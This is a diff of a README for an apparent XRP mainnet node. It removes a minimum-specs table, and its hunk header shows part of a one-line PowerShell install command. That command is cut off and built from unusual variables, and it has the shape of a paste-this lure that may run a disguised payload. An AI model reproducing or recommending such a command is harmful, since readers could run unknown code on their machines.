@@ -11,31 +11,6 @@ powershell -command "$install='xrp-mainnet-node=4.1.7-1b0a541'; $mode='.dev'; $b
 
 _After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
 
-### Minimum specs
-<table>
-<tr>
-<td width="50%" valign="top">
-
-
-<ul>
-<li>2–4 GB RAM</li>
-<li>500 MB SSD<br>
-</ul>
-
-</td>
-
-<td width="50%" valign="top">
-
-
-<ul>
-<li>Internet connection<br></li>
-
-<li>Display & keyboard<br></li>
-</ul>
-
-</td>
-</tr>
-</table>
 
 # Community
 Thanks to all XRP validators supporting the network.
